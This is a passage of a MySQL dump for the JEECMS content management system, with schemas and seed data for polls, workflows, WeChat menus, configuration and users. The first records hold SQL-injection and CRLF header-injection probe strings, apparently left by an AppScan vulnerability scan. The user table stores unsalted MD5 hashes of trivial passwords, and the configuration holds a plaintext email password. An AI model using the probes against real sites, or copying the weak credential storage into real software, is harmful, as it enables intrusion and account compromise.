http://192.168.0.2:51167/AppScanMsg.html?varId=1290;', '14'), ('110', '1234 and 0=7659', '14'), ('111', '1234/**/and/**/7659=7659', '14'), ('112', '&＃39;   ltrim&＃40;&＃39;&＃39;&＃41;   &＃39;1234', '14'), ('113', '1234', '14'), ('114', '1234 or 7659=7659', '14'), ('115', '&＃39;   &＃39;   &＃39;1234', '14'), ('116', '1234/**/and/**/0=7659', '14'), ('117', '12345 12345 1234', '14'), ('118', '1234', '14'), ('119', '1234', '14'), ('120', '1234&＃39;   &＃39;   &＃39;', '14'), ('121', '1234/**/or/**/7659=7659', '14'), ('122', '1234 and 7659=7659', '14'), ('123', '12345-1234-1234', '14'), ('124', '1234', '14'), ('125', '&＃40;select 1234&＃41;', '14'), ('126', '1234', '14'), ('127', '&＃39; || &＃39;&＃39; || &＃39;1234', '14'), ('128', '1234 and abc=7659', '14'), ('129', '&＃40;select 1234,1234&＃41;', '14'), ('130', '&＃39; || &＃39; || &＃39;1234', '14'), ('131', '&＃39;', '14'), ('132', '1234 or', '14'), ('133', '1234&＃39; || &＃39; || &＃39;', '14'), ('134', '&＃40;select 1234,', '14'), ('135', 'AVAK$&＃40;RETURN_CODE&＃41;OS', '14'), ('136', '\\&＃39;', '14'), ('137', ';', '14'), ('138', '1234', '14'), ('139', '\"', '14'), ('140', '1234', '14'), ('141', '1234XYZ', '14'), ('142', '\\\"', '14'), ('143', '1234kqprobebg000043', '14'), ('144', '1234\rAppScanHeader: AppScanValue/1.2-1350\rSecondAppScanHeader: whatever', '14'), ('145', '&＃41;', '14'), ('146', 'kqprobebg000043', '14'), ('147', '1234\r\nAppScanHeader: AppScanValue/1.2-1355\r\nSecondAppScanHeader: whatever', '14'), ('148', '\"&＃39;', '14'), ('149', '1234&＃39;Akqprobebg000043', '14'), ('150', '1234\"Akqprobebg000043', '14');
COMMIT;

-- ----------------------------
--  Table structure for `jc_vote_subtopic`
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_subtopic`;
CREATE TABLE `jc_vote_subtopic` (
  `subtopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `votetopic_id` int(11) NOT NULL DEFAULT '0' COMMENT '投票（调查）',
  `subtopic_type` int(2) NOT NULL DEFAULT '1' COMMENT '类型（1单选，2多选，3文本）',
  `priority` int(11) DEFAULT NULL,
  PRIMARY KEY (`subtopic_id`),
  KEY `FK_jc_vote_subtopic_vote` (`votetopic_id`),
  CONSTRAINT `FK_jc_vote_subtopic_vote` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8 COMMENT='投票子题目';

-- ----------------------------
--  Records of `jc_vote_subtopic`
-- ----------------------------
BEGIN;
INSERT INTO `jc_vote_subtopic` VALUES ('13', 'V8版本演示站网页的设计风格您喜欢吗？', '2', '1', '1'), ('14', '我觉得这里完善一下：', '2', '3', '3'), ('15', 'V8版本比V7版的设计风格有改进吗？', '2', '1', '2'), ('16', '您觉得V8演示站哪些模块做的比较好', '2', '2', '4'), ('18', '上海工资收入', '3', '1', '1'), ('20', '你喜欢哪个', '4', '1', '1'), ('21', '你支持哪个选手？', '5', '1', '1'), ('22', '你支持哪个选手？', '6', '1', '1'), ('23', '你支持哪个选手？', '7', '1', '1'), ('24', '你支持哪个选手？', '8', '1', '1'), ('25', '你支持哪个学校？', '9', '1', '1'), ('26', '国庆长假结束,您尽兴了吗?', '10', '1', '1'), ('27', '你对取消住房公积金怎么看？', '11', '1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_vote_topic`
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_topic`;
CREATE TABLE `jc_vote_topic` (
  `votetopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `repeate_hour` int(11) DEFAULT NULL COMMENT '重复投票限制时间，单位小时，为空不允许重复投票',
  `total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总投票数',
  `multi_select` int(11) NOT NULL DEFAULT '1' COMMENT '最多可以选择几项',
  `is_restrict_member` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制会员',
  `is_restrict_ip` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制IP',
  `is_restrict_cookie` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制COOKIE',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认主题',
  `limit_weixin` tinyint(1) DEFAULT '0' COMMENT '是否限制微信',
  `vote_day` int(11) DEFAULT '0' COMMENT '限定微信投票每个用户每日投票次数,为0时则投票期内限定投票一次',
  PRIMARY KEY (`votetopic_id`),
  KEY `fk_jc_votetopic_site` (`site_id`),
  CONSTRAINT `fk_jc_votetopic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='CMS投票主题';

-- ----------------------------
--  Records of `jc_vote_topic`
-- ----------------------------
BEGIN;
INSERT INTO `jc_vote_topic` VALUES ('2', '1', 'JEECMS演示站改版用户问卷调查', 'JEECMSv8版正式发布了，伴随着系统的完善，jeecms演示站的模板也一直在不断的改版，针对此次改版，jeecms美工团队特邀您参与“JEECMS演示站改版用户问卷调查”，希望大家能提出宝贵的意见，我们一定认真改进，谢谢大家的支持！', null, null, null, '84', '1', '0', '0', '0', '0', '1', '0', '0'), ('3', '1', '工资收入问卷调查', '工资收入问卷调查', '2016-09-30 14:51:49', '2016-09-30 15:00:49', null, '1', '1', '0', '0', '1', '0', '0', '0', '0'), ('4', '1', '男神女神主持选拔大赛', '男神女神主持选拔大赛开始了，美女帅哥云集，大家快来投票吧！', null, '2020-10-09 10:30:13', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('5', '1', '最美志愿者评选', '', null, '2019-01-09 10:33:59', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('6', '1', '2015年度好声音评选', '', null, '2016-12-31 10:35:16', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('7', '1', '“樱花女神”评选大赛 第一季', '', null, '2017-10-18 10:36:42', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('8', '1', '微信拍照大奖赛优秀作品 投票 开始啦', '', null, '2016-10-27 10:37:50', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('9', '1', '南昌“我的校园我的家 温馨校园”评选活动', '', null, '2017-12-01 10:38:52', null, '0', '1', '0', '0', '1', '0', '0', '0', '0'), ('10', '1', '国庆长假结束,您尽兴了吗?', '', null, '2017-10-10 10:40:41', null, '37', '1', '0', '0', '1', '0', '0', '0', '0'), ('11', '1', '专家建议取消住房公积金，这事儿你咋看？', '', null, '2018-10-18 10:42:29', null, '16', '1', '0', '0', '1', '0', '0', '0', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_webservice`
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice`;
CREATE TABLE `jc_webservice` (
  `service_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_address` varchar(255) NOT NULL DEFAULT '' COMMENT '接口地址',
  `target_namespace` varchar(255) DEFAULT NULL,
  `success_result` varchar(255) DEFAULT '' COMMENT '正确返回值',
  `service_type` varchar(50) DEFAULT NULL COMMENT '接口类型',
  `service_operate` varchar(50) DEFAULT NULL COMMENT '接口操作',
  PRIMARY KEY (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口表';

-- ----------------------------
--  Table structure for `jc_webservice_auth`
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_auth`;
CREATE TABLE `jc_webservice_auth` (
  `auth_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL COMMENT '用户名',
  `password` varchar(50) NOT NULL COMMENT '密码',
  `system` varchar(100) NOT NULL COMMENT '系统',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='webservices认证表';

-- ----------------------------
--  Table structure for `jc_webservice_call_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_call_record`;
CREATE TABLE `jc_webservice_call_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_code` varchar(50) NOT NULL COMMENT '接口识别码',
  `auth_id` int(11) NOT NULL COMMENT '调用的认证',
  `record_time` datetime NOT NULL COMMENT '调用时间',
  PRIMARY KEY (`record_id`),
  KEY `fk_webservice_record_auth` (`auth_id`),
  CONSTRAINT `fk_webservice_record_auth` FOREIGN KEY (`auth_id`) REFERENCES `jc_webservice_auth` (`auth_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口调用记录';

-- ----------------------------
--  Table structure for `jc_webservice_param`
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_param`;
CREATE TABLE `jc_webservice_param` (
  `service_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '0' COMMENT '排列顺序',
  `param_name` varchar(100) NOT NULL DEFAULT '' COMMENT '参数名',
  `default_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  KEY `fk_param_webservice` (`service_id`),
  CONSTRAINT `fk_param_webservice` FOREIGN KEY (`service_id`) REFERENCES `jc_webservice` (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口参数表';

-- ----------------------------
--  Table structure for `jc_workflow`
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow`;
CREATE TABLE `jc_workflow` (
  `workflow_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL COMMENT '站点',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_cross` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否允许跨级审核',
  PRIMARY KEY (`workflow_id`),
  KEY `fk_jc_workflow_site` (`site_id`),
  CONSTRAINT `fk_jc_workflow_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='工作流';

-- ----------------------------
--  Records of `jc_workflow`
-- ----------------------------
BEGIN;
INSERT INTO `jc_workflow` VALUES ('1', '1', '工作流', '工作流', '1', '0', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_workflow_event`
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_event`;
CREATE TABLE `jc_workflow_event` (
  `event_id` int(11) NOT NULL AUTO_INCREMENT,
  `workflow_id` int(11) NOT NULL COMMENT '工作流',
  `date_id` int(11) NOT NULL COMMENT '数据标识',
  `user_id` int(11) NOT NULL COMMENT '发起人',
  `start_time` datetime NOT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `next_step` int(11) NOT NULL DEFAULT '0' COMMENT '下个步骤',
  `date_type` int(11) NOT NULL DEFAULT '0' COMMENT '数据类型(0默认内容)',
  `is_finish` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否结束',
  `pass_num` int(11) DEFAULT NULL COMMENT '会签本节点通过人数',
  PRIMARY KEY (`event_id`),
  KEY `fk_event_workflow` (`workflow_id`),
  KEY `fk_workflow_event_user` (`user_id`),
  CONSTRAINT `fk_event_flow` FOREIGN KEY (`workflow_id`) REFERENCES `jc_workflow` (`workflow_id`),
  CONSTRAINT `fk_workflow_event_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COMMENT='工作流轨迹';

-- ----------------------------
--  Records of `jc_workflow_event`
-- ----------------------------
BEGIN;
INSERT INTO `jc_workflow_event` VALUES ('1', '1', '158', '2', '2018-10-19 13:17:13', '2018-10-19 13:17:31', '-1', '0', '1', '0'), ('2', '1', '159', '2', '2018-10-19 13:18:51', null, '2', '0', '0', '0'), ('3', '1', '160', '1', '2018-10-19 21:15:39', '2018-10-19 21:15:39', '-1', '0', '1', '0'), ('4', '1', '161', '1', '2018-10-19 21:15:48', '2018-10-19 21:15:48', '-1', '0', '1', '0'), ('5', '1', '162', '1', '2018-10-19 21:15:58', '2018-10-19 21:15:58', '-1', '0', '1', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_workflow_event_user`
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_event_user`;
CREATE TABLE `jc_workflow_event_user` (
  `event_user_id` int(11) NOT NULL AUTO_INCREMENT,
  `event_id` int(11) NOT NULL COMMENT '工作流转id',
  `user_id` int(11) NOT NULL COMMENT '流转用户',
  PRIMARY KEY (`event_user_id`),
  KEY `fk_jc_we_user` (`user_id`),
  KEY `fk_jc_we_event` (`event_id`),
  CONSTRAINT `fk_jc_we_event` FOREIGN KEY (`event_id`) REFERENCES `jc_workflow_event` (`event_id`),
  CONSTRAINT `fk_jc_we_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='工作流轨迹用户表';

-- ----------------------------
--  Records of `jc_workflow_event_user`
-- ----------------------------
BEGIN;
INSERT INTO `jc_workflow_event_user` VALUES ('2', '2', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_workflow_node`
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_node`;
CREATE TABLE `jc_workflow_node` (
  `workflow_id` int(11) NOT NULL COMMENT '工作流',
  `role_id` int(11) NOT NULL COMMENT '角色',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `is_countersign` tinyint(1) NOT NULL DEFAULT '0' COMMENT '1 会签 0普通流转',
  PRIMARY KEY (`workflow_id`,`priority`),
  KEY `fk_jc_node_workflow` (`workflow_id`),
  KEY `fk_jc_workflow_node_role` (`role_id`),
  CONSTRAINT `fk_jc_node_workflow` FOREIGN KEY (`workflow_id`) REFERENCES `jc_workflow` (`workflow_id`),
  CONSTRAINT `fk_jc_workflow_node_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='工作流节点';

-- ----------------------------
--  Records of `jc_workflow_node`
-- ----------------------------
BEGIN;
INSERT INTO `jc_workflow_node` VALUES ('1', '2', '0', '0'), ('1', '1', '1', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_workflow_record`
-- ----------------------------
DROP TABLE IF EXISTS `jc_workflow_record`;
CREATE TABLE `jc_workflow_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '操作人',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `event_id` int(11) NOT NULL DEFAULT '0' COMMENT '轨迹',
  `record_time` datetime NOT NULL COMMENT '创建时间',
  `opinion` varchar(255) DEFAULT NULL COMMENT '意见',
  `type` int(11) NOT NULL DEFAULT '0' COMMENT '类型(1:通过  2退回 3保持)',
  PRIMARY KEY (`record_id`),
  KEY `fk_jc_workflowrecord_user` (`user_id`),
  KEY `fk_jc_workflowrecord_site` (`site_id`),
  KEY `fk_jc_workflowrecord_event` (`event_id`),
  CONSTRAINT `fk_jc_workflowrecord_event` FOREIGN KEY (`event_id`) REFERENCES `jc_workflow_event` (`event_id`),
  CONSTRAINT `fk_jc_workflowrecord_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_workflowrecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='工作流日志记录';

-- ----------------------------
--  Records of `jc_workflow_record`
-- ----------------------------
BEGIN;
INSERT INTO `jc_workflow_record` VALUES ('1', '2', '1', '1', '2018-10-19 13:17:13', null, '1'), ('2', '1', '1', '1', '2018-10-19 13:17:31', null, '1'), ('3', '2', '1', '2', '2018-10-19 13:18:51', null, '1'), ('4', '1', '1', '3', '2018-10-19 21:15:39', null, '1'), ('5', '1', '1', '4', '2018-10-19 21:15:49', null, '1'), ('6', '1', '1', '5', '2018-10-19 21:15:58', null, '1');
COMMIT;

-- ----------------------------
--  Table structure for `jg_weixin`
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixin`;
CREATE TABLE `jg_weixin` (
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wx_pic` varchar(255) DEFAULT NULL COMMENT '微信二维码',
  `wx_welcome` varchar(255) NOT NULL DEFAULT '' COMMENT '关注欢迎语'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `jg_weixin`
-- ----------------------------
BEGIN;
INSERT INTO `jg_weixin` VALUES ('1', '/u/cms/www/201510/08105041f9xd.jpg', '江西金磊科技有限公司欢迎您!');
COMMIT;

-- ----------------------------
--  Table structure for `jg_weixinmenu`
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmenu`;
CREATE TABLE `jg_weixinmenu` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_name` varchar(255) DEFAULT NULL COMMENT '微信菜单名称',
  `wm_type` varchar(255) DEFAULT NULL COMMENT '微信菜单类别',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_key` varchar(255) DEFAULT NULL COMMENT '点击key',
  `wm_parent_id` int(11) DEFAULT NULL COMMENT '父节点',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `jg_weixinmenu`
-- ----------------------------
BEGIN;
INSERT INTO `jg_weixinmenu` VALUES ('1', '1', '找官方', 'view', 'http://demo.jeecms.com/html/news/', '1', null), ('2', '1', '演示站', 'view', 'http://demo.jeecms.com/html/picture/', '2', null), ('3', '1', '新闻资讯', 'view', 'http://demo.jeecms.com/html/veido/', '3', null), ('4', '1', '论坛', 'view', 'http://bbs.jeecms.com', '4', '1'), ('5', '1', '官网', 'view', 'http://www.honghe.com/', '5', '1'), ('6', '1', 'JSPGOU', 'view', 'http://demo3.jeecms.com', '6', '2'), ('7', '1', 'JEEBBS', 'view', 'http://bbs.jeecms.com', '7', '2'), ('8', '1', '图库', 'view', 'http://demo.jeecms.com/news/index.jhtml/pic/index.jhtml', '8', '3'), ('9', '1', '新闻', 'click', '', 'news', '3'), ('10', '1', 'JEECMS', 'view', 'http://demo.jeecms.com/', '', '2'), ('11', '1', '视频', 'view', 'http://demo.jeecms.com/veido/index.jhtml', '', '3'), ('12', '1', '下载', 'view', 'http://demo.jeecms.com/download/index.jhtml', 'http://demo19.jeecms.com/download/index.jhtml', '3'), ('13', '1', '调查', 'view', 'http://demo.jeecms.com/survey.jhtml', 'http://demo19.jeecms.com/wldc/index.jhtml', '3'), ('14', '1', 'JSPGOU店中店', 'view', 'http://dzd.jeecms.com/', 'http://dzd.jeecms.com/', '2');
COMMIT;

-- ----------------------------
--  Table structure for `jg_weixinmessage`
-- ----------------------------
DROP TABLE IF EXISTS `jg_weixinmessage`;
CREATE TABLE `jg_weixinmessage` (
  `wm_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  `wm_number` varchar(255) DEFAULT NULL COMMENT '序号',
  `wm_title` varchar(255) DEFAULT NULL COMMENT '标题',
  `wm_path` varchar(255) DEFAULT NULL COMMENT '图片地址',
  `wm_url` varchar(255) DEFAULT NULL COMMENT '链接地址',
  `wm_content` varchar(255) DEFAULT NULL COMMENT '内容',
  `is_welcome` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否欢迎页',
  `wm_msg_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息类型(0带图文链接 1内容加关键字提示 2仅有内容)',
  PRIMARY KEY (`wm_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
--  Records of `jg_weixinmessage`
-- ----------------------------
BEGIN;
INSERT INTO `jg_weixinmessage` VALUES ('1', '1', null, '留言', '/u/cms/www/201510/08172019lz4w.png', 'http://demo.jeecms.com/guestbook.jspx', '金磊科技欢迎您!', '1', '0'), ('2', '1', 'news', '新闻', '/u/cms/www/201510/27142936gt6k.jpg', 'http://demo19.jeecms.com/news/index.jhtml', '新闻', '0', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jo_authentication`
-- ----------------------------
DROP TABLE IF EXISTS `jo_authentication`;
CREATE TABLE `jo_authentication` (
  `authentication_id` char(32) NOT NULL COMMENT '认证ID',
  `userid` int(11) NOT NULL COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `login_time` datetime NOT NULL COMMENT '登录时间',
  `login_ip` varchar(50) NOT NULL COMMENT '登录ip',
  `update_time` datetime NOT NULL COMMENT '更新时间',
  PRIMARY KEY (`authentication_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='认证信息表';

-- ----------------------------
--  Table structure for `jo_config`
-- ----------------------------
DROP TABLE IF EXISTS `jo_config`;
CREATE TABLE `jo_config` (
  `cfg_key` varchar(50) NOT NULL COMMENT '配置KEY',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '配置VALUE',
  PRIMARY KEY (`cfg_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='配置表';

-- ----------------------------
--  Records of `jo_config`
-- ----------------------------
BEGIN;
INSERT INTO `jo_config` VALUES ('email_encoding', ''), ('email_host', 'smtp.qq.com'), ('email_password', '123'), ('email_personal', ''), ('email_port', '25'), ('email_username', '154447798@qq.com'), ('login_error_interval', '30'), ('login_error_times', '3'), ('message_forgotpassword_subject', '找回科技综合管理系统密码'), ('message_forgotpassword_text', '感谢您使用科技综合管理系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost:8080/jeecmsv7/member/password_reset.jspx?uid=${uid}&key=${resetKey}'), ('message_register_subject', '欢迎您注册JEECMS用户'), ('message_register_text', '${username}您好：\r\n欢迎您注册科技综合管理系统会员\r\n请点击以下链接进行激活\r\nhttp://localhost:8080/jeecmsv7/active.jspx?username=${username}&key=${activationCode}'), ('message_subject', 'JEECMS会员密码找回信息'), ('message_text', '感谢您使用JEECMS系统会员密码找回功能，请记住以下找回信息：\r\n用户ID：${uid}\r\n用户名：${username}\r\n您的新密码为：${resetPwd}\r\n请访问如下链接新密码才能生效：\r\nhttp://localhost/member/password_reset.jspx?uid=${uid}&key=${resetKey}\r\n');
COMMIT;

-- ----------------------------
--  Table structure for `jo_ftp`
-- ----------------------------
DROP TABLE IF EXISTS `jo_ftp`;
CREATE TABLE `jo_ftp` (
  `ftp_id` int(11) NOT NULL AUTO_INCREMENT,
  `ftp_name` varchar(100) NOT NULL COMMENT '名称',
  `ip` varchar(50) NOT NULL COMMENT 'IP',
  `port` int(11) NOT NULL DEFAULT '21' COMMENT '端口号',
  `username` varchar(100) DEFAULT NULL COMMENT '登录名',
  `password` varchar(100) DEFAULT NULL COMMENT '登陆密码',
  `encoding` varchar(20) NOT NULL DEFAULT 'UTF-8' COMMENT '编码',
  `timeout` int(11) DEFAULT NULL COMMENT '超时时间',
  `ftp_path` varchar(255) DEFAULT NULL COMMENT '路径',
  `url` varchar(255) NOT NULL COMMENT '访问URL',
  PRIMARY KEY (`ftp_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FTP表';

-- ----------------------------
--  Table structure for `jo_template`
-- ----------------------------
DROP TABLE IF EXISTS `jo_template`;
CREATE TABLE `jo_template` (
  `tpl_name` varchar(150) NOT NULL COMMENT '模板名称',
  `tpl_source` longtext COMMENT '模板内容',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `is_directory` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否目录',
  PRIMARY KEY (`tpl_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='模板表';

-- ----------------------------
--  Table structure for `jo_upload`
-- ----------------------------
DROP TABLE IF EXISTS `jo_upload`;
CREATE TABLE `jo_upload` (
  `filename` varchar(150) NOT NULL COMMENT '文件名',
  `length` int(11) NOT NULL COMMENT '文件大小(字节)',
  `last_modified` bigint(20) NOT NULL COMMENT '最后修改时间',
  `content` longblob NOT NULL COMMENT '内容',
  PRIMARY KEY (`filename`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='上传附件表';

-- ----------------------------
--  Table structure for `jo_user`
-- ----------------------------
DROP TABLE IF EXISTS `jo_user`;
CREATE TABLE `jo_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮箱',
  `password` char(32) NOT NULL COMMENT '密码',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `reset_key` char(32) DEFAULT NULL COMMENT '重置密码KEY',
  `reset_pwd` varchar(10) DEFAULT NULL COMMENT '重置密码VALUE',
  `error_time` datetime DEFAULT NULL COMMENT '登录错误时间',
  `error_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录错误次数',
  `error_ip` varchar(50) DEFAULT NULL COMMENT '登录错误IP',
  `activation` tinyint(1) NOT NULL DEFAULT '1' COMMENT '激活状态',
  `activation_code` char(32) DEFAULT NULL COMMENT '激活码',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='用户表';

-- ----------------------------
--  Records of `jo_user`
-- ----------------------------
BEGIN;
INSERT INTO `jo_user` VALUES ('1', 'admin', 'aa@qq.com', '21232f297a57a5a743894a0e4a801fc3', '2011-01-03 00:00:00', '127.0.0.1', '2018-10-23 18:05:08', '110.184.80.250', '1189', null, null, null, '0', null, '1', null), ('2', 'test', null, '098f6bcd4621d373cade4e832627b4f6', '2018-10-19 12:51:12', '127.0.0.1', '2018-10-19 13:08:53', '127.0.0.1', '3', null, null, null, '0', null, '1', null), ('3', 'testuser', null, 'e10adc3949ba59abbe56e057f20f883e', '2018-10-23 15:09:43', '39.128.162.98', '2018-10-23 15:10:32', '39.128.162.98', '1', null, null, null, '0', null, '1', null), ('4', 'teststaff', '', 'e10adc3949ba59abbe56e057f20f883e', '2018-10-23 15:13:52', '39.128.162.98', '2018-10-23 16:59:52', '39.128.162.98', '1', null, null, null, '0', null, '1', null);
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
